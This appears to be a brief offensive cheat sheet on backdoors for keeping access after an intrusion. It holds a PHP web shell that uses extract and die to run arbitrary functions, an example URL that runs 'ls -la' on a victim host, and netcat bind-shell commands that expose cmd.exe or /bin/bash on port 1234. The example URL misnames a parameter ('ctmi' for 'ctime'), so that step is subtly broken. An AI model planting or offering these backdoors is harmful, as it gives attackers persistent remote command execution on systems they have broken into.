Backdoors
======
Backdoors are a very convenient way to connect to your target and maintain access after an intrusion.

PHP Extract Backdoor
======
Stealthy Backdoor with @extract and @die
```php
<?php
    @extract($_REQUEST);
    @die($ctime($atime));
```

Exploit this way
```
http://victim.com/backdoor.php?ctmi=system&atime=ls -la
```

Netcat Backdoor
======
Simple Netcat Backdoor
```
// Windows
nc -l -p 1234 -e cmd.exe

//Linux
nc -l -p 1234 -e /bin/bash
```

Connect using
```
nc xxx.xxx.xxx.xxx 1234
```

